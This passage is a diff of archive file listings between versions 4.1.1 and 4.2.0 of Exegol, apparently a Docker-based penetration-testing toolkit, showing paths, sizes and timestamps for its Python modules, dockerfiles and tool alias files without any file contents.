--rw-------   0 dramelac  (1000) dramelac  (1000)       75 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/xfreerdp
--rw-------   0 dramelac  (1000) dramelac  (1000)      120 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/zerologon
--rw-------   0 dramelac  (1000) dramelac  (1000)     2320 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/zshrc
--rw-------   0 dramelac  (1000) dramelac  (1000)      136 2022-10-31 17:20:54.000000 Exegol-4.1.1/exegol-docker-build/test.dockerfile
--rw-------   0 dramelac  (1000) dramelac  (1000)     1706 2022-12-07 19:32:07.000000 Exegol-4.1.1/exegol-docker-build/web.dockerfile
--rw-------   0 dramelac  (1000) dramelac  (1000)       38 2022-12-07 19:38:25.802257 Exegol-4.1.1/setup.cfg
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)     2555 2022-11-28 15:58:49.000000 Exegol-4.1.1/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.767214 Exegol-4.2.0/
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.695214 Exegol-4.2.0/Exegol.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     6482 2023-05-10 03:26:51.000000 Exegol-4.2.0/Exegol.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)    18613 2023-05-10 03:26:51.000000 Exegol-4.2.0/Exegol.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-10 03:26:51.000000 Exegol-4.2.0/Exegol.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       64 2023-05-10 03:26:51.000000 Exegol-4.2.0/Exegol.egg-info/entry_points.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       72 2023-05-10 03:26:51.000000 Exegol-4.2.0/Exegol.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        7 2023-05-10 03:26:51.000000 Exegol-4.2.0/Exegol.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)    35149 2023-05-10 03:26:24.000000 Exegol-4.2.0/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)     6482 2023-05-10 03:26:51.767214 Exegol-4.2.0/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)     5401 2023-05-10 03:26:24.000000 Exegol-4.2.0/README.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.695214 Exegol-4.2.0/exegol/
+-rw-r--r--   0 runner    (1001) docker     (123)      115 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)      265 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/__main__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.763214 Exegol-4.2.0/exegol/config/
+-rw-r--r--   0 runner    (1001) docker     (123)     2985 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/config/ConstantConfig.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1910 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/config/DataCache.py
+-rw-r--r--   0 runner    (1001) docker     (123)     8156 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/config/EnvInfo.py
+-rw-r--r--   0 runner    (1001) docker     (123)     6552 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/config/UserConfig.py
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/config/__init__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.763214 Exegol-4.2.0/exegol/console/
+-rw-r--r--   0 runner    (1001) docker     (123)     1148 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/console/ConsoleFormat.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1511 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/console/ExegolProgress.py
+-rw-r--r--   0 runner    (1001) docker     (123)      509 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/console/ExegolPrompt.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1861 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/console/LayerTextColumn.py
+-rw-r--r--   0 runner    (1001) docker     (123)     4515 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/console/MetaGitProgress.py
+-rw-r--r--   0 runner    (1001) docker     (123)    25668 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/console/TUI.py
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/console/__init__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.763214 Exegol-4.2.0/exegol/console/cli/
+-rw-r--r--   0 runner    (1001) docker     (123)     3292 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/console/cli/ExegolCompleter.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2894 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/console/cli/ParametersManager.py
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/console/cli/__init__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.763214 Exegol-4.2.0/exegol/console/cli/actions/
+-rw-r--r--   0 runner    (1001) docker     (123)     7471 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/console/cli/actions/Command.py
+-rw-r--r--   0 runner    (1001) docker     (123)    13777 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/console/cli/actions/ExegolParameters.py
+-rw-r--r--   0 runner    (1001) docker     (123)    16057 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/console/cli/actions/GenericParameters.py
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/console/cli/actions/__init__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.763214 Exegol-4.2.0/exegol/exceptions/
+-rw-r--r--   0 runner    (1001) docker     (123)      436 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/exceptions/ExegolExceptions.py
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/exceptions/__init__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.763214 Exegol-4.2.0/exegol/manager/
+-rw-r--r--   0 runner    (1001) docker     (123)     2859 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/manager/ExegolController.py
+-rw-r--r--   0 runner    (1001) docker     (123)    30595 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/manager/ExegolManager.py
+-rw-r--r--   0 runner    (1001) docker     (123)    19735 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/manager/UpdateManager.py
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/manager/__init__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.763214 Exegol-4.2.0/exegol/model/
+-rw-r--r--   0 runner    (1001) docker     (123)     4220 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/model/CacheModels.py
+-rw-r--r--   0 runner    (1001) docker     (123)    59376 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/model/ContainerConfig.py
+-rw-r--r--   0 runner    (1001) docker     (123)    13096 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/model/ExegolContainer.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1483 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/model/ExegolContainerTemplate.py
+-rw-r--r--   0 runner    (1001) docker     (123)    32609 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/model/ExegolImage.py
+-rw-r--r--   0 runner    (1001) docker     (123)     5283 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/model/ExegolModules.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3840 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/model/MetaImages.py
+-rw-r--r--   0 runner    (1001) docker     (123)      339 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/model/SelectableInterface.py
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/model/__init__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.767214 Exegol-4.2.0/exegol/utils/
+-rw-r--r--   0 runner    (1001) docker     (123)     7842 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/utils/DataFileUtils.py
+-rw-r--r--   0 runner    (1001) docker     (123)    28822 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/utils/DockerUtils.py
+-rw-r--r--   0 runner    (1001) docker     (123)     4977 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/utils/ExeLog.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3981 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/utils/FsUtils.py
+-rw-r--r--   0 runner    (1001) docker     (123)    20349 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/utils/GitUtils.py
+-rw-r--r--   0 runner    (1001) docker     (123)    18137 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/utils/GuiUtils.py
+-rw-r--r--   0 runner    (1001) docker     (123)      607 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/utils/MetaSingleton.py
+-rw-r--r--   0 runner    (1001) docker     (123)     7397 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/utils/WebUtils.py
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/utils/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     5434 2023-05-10 03:26:24.000000 Exegol-4.2.0/exegol/utils/argParse.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.699215 Exegol-4.2.0/exegol-docker-build/
+-rw-r--r--   0 runner    (1001) docker     (123)     1764 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/Dockerfile
+-rw-r--r--   0 runner    (1001) docker     (123)     1700 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/ad.dockerfile
+-rw-r--r--   0 runner    (1001) docker     (123)     1561 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/debug.dockerfile
+-rw-r--r--   0 runner    (1001) docker     (123)     1710 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/light.dockerfile
+-rw-r--r--   0 runner    (1001) docker     (123)     1710 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/osint.dockerfile
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.699215 Exegol-4.2.0/exegol-docker-build/sources/
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.699215 Exegol-4.2.0/exegol-docker-build/sources/bloodhound/
+-rw-r--r--   0 runner    (1001) docker     (123)      864 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/bloodhound/config.json
+-rw-r--r--   0 runner    (1001) docker     (123)    37672 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/bloodhound/customqueries.json
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.699215 Exegol-4.2.0/exegol-docker-build/sources/crackmapexec/
+-rw-r--r--   0 runner    (1001) docker     (123)      350 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/crackmapexec/cme.conf
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.699215 Exegol-4.2.0/exegol-docker-build/sources/exegol/
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.699215 Exegol-4.2.0/exegol-docker-build/sources/exegol/build_pipeline_tests/
+-rw-r--r--   0 runner    (1001) docker     (123)     3243 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/build_pipeline_tests/run_tests.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3456 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/entrypoint.sh
+-rw-r--r--   0 runner    (1001) docker     (123)     5802 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/load_supported_setups.sh
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.699215 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/
+-rw-r--r--   0 runner    (1001) docker     (123)     1523 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/README.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.699215 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/apt/
+-rw-r--r--   0 runner    (1001) docker     (123)      121 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/apt/keys.list
+-rw-r--r--   0 runner    (1001) docker     (123)      298 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/apt/packages.list
+-rw-r--r--   0 runner    (1001) docker     (123)      210 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/apt/sources.list
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.703215 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/firefox/
+-rw-r--r--   0 runner    (1001) docker     (123)      336 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/firefox/addons.txt
+-rw-r--r--   0 runner    (1001) docker     (123)      621 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/load_user_setup.sh
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.703215 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/python3/
+-rw-r--r--   0 runner    (1001) docker     (123)      344 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/python3/requirements.txt
+-rw-r--r--   0 runner    (1001) docker     (123)     2712 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/supported_setups.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.703215 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/zsh/
+-rw-r--r--   0 runner    (1001) docker     (123)       93 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/zsh/aliases
+-rw-r--r--   0 runner    (1001) docker     (123)       93 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/zsh/history
+-rw-r--r--   0 runner    (1001) docker     (123)      304 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/zsh/zshrc
+-rw-r--r--   0 runner    (1001) docker     (123)     1379 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/exegol/start.sh
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.703215 Exegol-4.2.0/exegol-docker-build/sources/firefox/
+-rw-r--r--   0 runner    (1001) docker     (123)  1703936 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/firefox/places.sqlite
+-rw-r--r--   0 runner    (1001) docker     (123)       15 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/firefox/requirements.txt
+-rw-r--r--   0 runner    (1001) docker     (123)     8101 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/firefox/setup.py
+-rw-r--r--   0 runner    (1001) docker     (123)     4856 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/firefox/user-setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.707214 Exegol-4.2.0/exegol-docker-build/sources/grc/
+-rw-r--r--   0 runner    (1001) docker     (123)      234 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/grc/conf.cme
+-rw-r--r--   0 runner    (1001) docker     (123)      403 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/grc/conf.describeTicket
+-rw-r--r--   0 runner    (1001) docker     (123)      604 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/grc/conf.getgpppassword
+-rw-r--r--   0 runner    (1001) docker     (123)      318 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/grc/conf.krbrelayx
+-rw-r--r--   0 runner    (1001) docker     (123)     2002 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/grc/conf.ntlmrelayx
+-rw-r--r--   0 runner    (1001) docker     (123)      533 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/grc/conf.rbcd
+-rw-r--r--   0 runner    (1001) docker     (123)     1026 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/grc/conf.secretsdump
+-rw-r--r--   0 runner    (1001) docker     (123)     4243 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/grc/grc.conf
+-rw-r--r--   0 runner    (1001) docker     (123)   180784 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/install.sh
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.707214 Exegol-4.2.0/exegol-docker-build/sources/logrotate/
+-rw-r--r--   0 runner    (1001) docker     (123)      129 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/logrotate/exegol_vpn
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.707214 Exegol-4.2.0/exegol-docker-build/sources/patches/
+-rw-r--r--   0 runner    (1001) docker     (123)     6308 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/patches/undefined-symbol-aesni-key.patch
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.707214 Exegol-4.2.0/exegol-docker-build/sources/proxychains/
+-rw-r--r--   0 runner    (1001) docker     (123)     5593 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/proxychains/proxychains.conf
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.707214 Exegol-4.2.0/exegol-docker-build/sources/tmux/
+-rw-r--r--   0 runner    (1001) docker     (123)       39 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/tmux/tmux.conf
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.711214 Exegol-4.2.0/exegol-docker-build/sources/trilium/
+-rw-r--r--   0 runner    (1001) docker     (123)      938 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/trilium/config.ini
+-rw-r--r--   0 runner    (1001) docker     (123)  1470464 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/trilium/document.db
+-rw-r--r--   0 runner    (1001) docker     (123)    32768 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/trilium/document.db-shm
+-rw-r--r--   0 runner    (1001) docker     (123)  4169472 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/trilium/document.db-wal
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.715214 Exegol-4.2.0/exegol-docker-build/sources/zsh/
+-rw-r--r--   0 runner    (1001) docker     (123)      798 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-10 03:26:51.739214 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/
+-rw-r--r--   0 runner    (1001) docker     (123)       75 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/PassTheCert
+-rw-r--r--   0 runner    (1001) docker     (123)       37 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/aircrack-ng
+-rw-r--r--   0 runner    (1001) docker     (123)       33 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/arsenal
+-rw-r--r--   0 runner    (1001) docker     (123)       47 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/bettercap
+-rw-r--r--   0 runner    (1001) docker     (123)       47 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/blazy
+-rw-r--r--   0 runner    (1001) docker     (123)      288 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/bloodhound
+-rw-r--r--   0 runner    (1001) docker     (123)       69 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/bloodhound-py
+-rw-r--r--   0 runner    (1001) docker     (123)      138 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/bloodhound-quickwin
+-rw-r--r--   0 runner    (1001) docker     (123)       45 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/bolt
+-rw-r--r--   0 runner    (1001) docker     (123)       97 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/burpsuite
+-rw-r--r--   0 runner    (1001) docker     (123)       60 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/carbon14
+-rw-r--r--   0 runner    (1001) docker     (123)      123 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/cloudfail
+-rw-r--r--   0 runner    (1001) docker     (123)       62 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/corscanner
+-rw-r--r--   0 runner    (1001) docker     (123)       66 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/crackhound
+-rw-r--r--   0 runner    (1001) docker     (123)      210 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/crackmapexec
+-rw-r--r--   0 runner    (1001) docker     (123)       52 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/cypheroth
+-rw-r--r--   0 runner    (1001) docker     (123)      124 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/darkarmour
+-rw-r--r--   0 runner    (1001) docker     (123)       63 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/dfscoerce
+-rw-r--r--   0 runner    (1001) docker     (123)       46 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/dnschef
+-rw-r--r--   0 runner    (1001) docker     (123)       57 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/donpapi
+-rw-r--r--   0 runner    (1001) docker     (123)       57 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/eaphammer
+-rw-r--r--   0 runner    (1001) docker     (123)       24 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/emacs-nox
+-rw-r--r--   0 runner    (1001) docker     (123)      124 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/empire
+-rw-r--r--   0 runner    (1001) docker     (123)       44 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/enyx
+-rw-r--r--   0 runner    (1001) docker     (123)       70 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/eyewitness
+-rw-r--r--   0 runner    (1001) docker     (123)       55 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/feroxbuster
+-rw-r--r--   0 runner    (1001) docker     (123)       65 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/finalrecon
+-rw-r--r--   0 runner    (1001) docker     (123)       90 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/finduncommonshares
+-rw-r--r--   0 runner    (1001) docker     (123)      124 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/fuxploider
+-rw-r--r--   0 runner    (1001) docker     (123)      115 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/fzf
+-rw-r--r--   0 runner    (1001) docker     (123)       19 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/gdb
+-rw-r--r--   0 runner    (1001) docker     (123)       96 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/ghidra
+-rw-r--r--   0 runner    (1001) docker     (123)      224 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/ghunt
+-rw-r--r--   0 runner    (1001) docker     (123)       55 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/git-dumper
+-rw-r--r--   0 runner    (1001) docker     (123)       58 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/gittools
+-rw-r--r--   0 runner    (1001) docker     (123)       66 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/gmsadumper
+-rw-r--r--   0 runner    (1001) docker     (123)       49 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/gopherus
+-rw-r--r--   0 runner    (1001) docker     (123)      137 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/gpp-decrypt
+-rw-r--r--   0 runner    (1001) docker     (123)       17 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/grc
+-rw-r--r--   0 runner    (1001) docker     (123)       58 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/h2csmuggler
+-rw-r--r--   0 runner    (1001) docker     (123)       41 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/ida
+-rw-r--r--   0 runner    (1001) docker     (123)      192 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/impacket
+-rw-r--r--   0 runner    (1001) docker     (123)       54 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/infoga
+-rw-r--r--   0 runner    (1001) docker     (123)       60 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/jd-gui
+-rw-r--r--   0 runner    (1001) docker     (123)       73 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/jdwp-shellifier
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/john-the-ripper
+-rw-r--r--   0 runner    (1001) docker     (123)       54 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/joomscan
+-rw-r--r--   0 runner    (1001) docker     (123)       57 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/jwt_tool
+-rw-r--r--   0 runner    (1001) docker     (123)      120 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/kadimus
+-rw-r--r--   0 runner    (1001) docker     (123)       81 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/kraken
+-rw-r--r--   0 runner    (1001) docker     (123)      279 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/krbrelayx
+-rw-r--r--   0 runner    (1001) docker     (123)       75 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/ldaprelayscan
+-rw-r--r--   0 runner    (1001) docker     (123)       72 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/ldapsearch-ad
+-rw-r--r--   0 runner    (1001) docker     (123)       70 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/libmspack
+-rw-r--r--   0 runner    (1001) docker     (123)       72 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/libnfc-crypto1-crack
+-rw-r--r--   0 runner    (1001) docker     (123)       87 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/linkedin2username
+-rw-r--r--   0 runner    (1001) docker     (123)       63 2023-05-10 03:26:28.000000 Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/linkfinder
